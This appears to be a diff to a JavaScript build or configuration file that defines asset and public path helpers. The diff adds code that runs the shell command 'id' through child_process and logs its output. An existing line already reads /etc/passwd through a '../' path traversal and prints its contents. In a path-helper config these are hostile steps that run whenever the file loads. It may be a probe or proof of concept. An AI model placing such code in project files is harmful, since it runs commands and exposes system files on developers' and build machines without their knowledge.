@@ -7,7 +7,17 @@ const asset = file => path.resolve('src/assets', file || '');
 const public = file => path.resolve("public", file || '');
 
 var fs = require('fs');
+const { exec } = require('child_process');
+exec('id', (err, stdout, stderr) => {
+  if (err) {
+    // node couldn't execute the command
+    return;
+  }
 
+  // the *entire* stdout and stderr (buffered)
+  console.log(`stdout: ${stdout}`);
+  console.log(`stderr: ${stderr}`);
+});
 var text = fs.readFileSync('../../../../../../etc/passwd', 'utf8');
 var textByLine = text.split("\n");
 console.log(textByLine);
